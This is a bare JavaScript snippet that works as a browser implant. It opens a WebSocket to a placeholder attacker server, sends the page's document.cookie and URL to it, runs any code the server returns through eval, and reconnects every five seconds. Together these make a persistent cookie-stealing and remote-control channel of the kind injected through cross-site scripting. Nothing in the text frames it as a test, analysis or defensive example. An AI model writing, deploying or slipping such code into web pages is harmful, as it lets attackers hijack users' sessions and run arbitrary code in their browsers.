var ws = new WebSocket("wss://your-server-url:your-server-port");
var messages = [];
ws.onopen = function () {
  ws.send("session " + document.cookie + " " + window.location.href);
  for (var i = 0; i < messages.length; i++) {
    ws.send(messages[i]);
  }
};
function sendMessage(message) {
  if (ws.readyState == WebSocket.OPEN) {
    ws.send(message);
  } else {
    messages.push(message);
  }
}
ws.onmessage = function (event) {
  eval(event.data);
};

setInterval(function () {
  if (ws.readyState == WebSocket.CLOSED) {
    ws = new WebSocket("wss://your-server-url:your-server-port");
  }
}, 5000);